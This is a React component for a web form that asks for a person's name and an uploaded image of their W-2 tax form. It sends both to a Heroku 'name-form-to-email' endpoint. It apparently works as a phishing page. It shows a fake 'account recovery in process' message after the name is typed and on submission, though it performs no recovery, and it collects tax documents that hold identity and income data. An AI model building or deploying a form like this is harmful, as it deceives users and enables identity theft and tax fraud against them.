import React, { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import Container from 'react-bootstrap/Container'
import Toast from 'react-bootstrap/Toast'
import Row from 'react-bootstrap/Row'
import Form from 'react-bootstrap/Form'
import Button from 'react-bootstrap/Button'
import Spinner from 'react-bootstrap/Spinner'
import { FilePond, registerPlugin } from 'react-filepond'
import FilePondPluginFileValidateType from 'filepond-plugin-file-validate-type';
import FilePondPluginImagePreview from 'filepond-plugin-image-preview';
import 'filepond/dist/filepond.min.css'
import 'filepond-plugin-image-preview/dist/filepond-plugin-image-preview.css';

import 'bootstrap/dist/css/bootstrap.min.css'
import './jsform.css'

import bg from './background_img.jpg'

registerPlugin(FilePondPluginFileValidateType, FilePondPluginImagePreview);


export default function JSForm() {

    const [name, setName] = useState('');
    const [file, setFile] = useState([]);
    const [showRecovery, setShowRecovery] = useState(false);
    const [showSpinner, setShowSpinner] = useState(false);
    const [showToast, setShowToast] = useState(false);

    async function validate(e) {
        e.preventDefault();
        let fullName = document.querySelector('.fullName').value;

        console.log('l: ', file.length);
        if (!fullName || file.length === 0) {
            alert('Please fill in name field and upload form');
            return 0;
        }
        else {
            e.target.disabled = true;
            setShowSpinner(true);
            try {
                const response = await fetch('https://name-form-to-email.herokuapp.com/name', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        fullName: fullName,
                        file: file[0]
                    }),
                });
                const data = await response.json();
                setShowSpinner(false);

                e.target.disabled = false;
                if (data.successful) {
                    setShowToast(true);
                }
                else {
                    alert('Mail could not be sent. Please try again !');
                }
            } catch (e) { console.log(e.message) }
        }
    }

    return (
        <div className='Form'>
            <Container className='col-lg-6 col-md-8 col-sm-12'>
                <div className='img_div'>
                    <img src={bg} />
                </div>
                <form encType='multipart/form-data'>
                    <Toast className='toast'
                        bg='success' onClose={() => setShowToast(!showToast)}
                        show={showToast}
                        autohide
                        delay={5000}>
                        <Toast.Body>
                            Submission successful ! Account recovery in process... !
                        </Toast.Body>
                    </Toast>
                    <Row className='row'>
                        <div className='label col12'>Name</div>
                        <span className='col-12'>
                            <Form.Control name='fullName' value={name} className='fullName' onChange={(e) => {
                                setName(e.target.value);
                                let timeout = setTimeout(function () {
                                    if(name.length !==0) setShowRecovery(true);
                                }, 2000);
                            }
                            } />
                        </span>
                    </Row>
                    <Row>
                        <div className='recovery_text'>
                            {showRecovery ?
                                <><span className='name_span'>{name}</span><span>, account recovery in process...</span></> : ''
                            }
                        </div>
                    </Row>
                    <Row>
                        <div className='col-12'>
                            W2 Form / Tax Form
                        </div>
                    </Row>
                    <Row>
                        <FilePond
                            acceptedFileTypes={['image/*']}
                            maxFiles='1'
                            onupdatefiles={setFile}
                            labelIdle='Drag & Drop to upload form | <span class="filepond--label-action">Browse</span>'
                            name='file'
                            server='https://name-form-to-email.herokuapp.com/file'
                            className='filePond'
                        />
                    </Row>
                    <div className='btn_div'>
                        {showSpinner ?
                            <Spinner animation='border' role='status' variant='primary' size='sm' className='spinner' /> : ''
                        }
                        <Button className='submit_btn' onClick={validate}>Submit</Button>
                    </div>
                </form>
            </Container>
        </div>
    )
}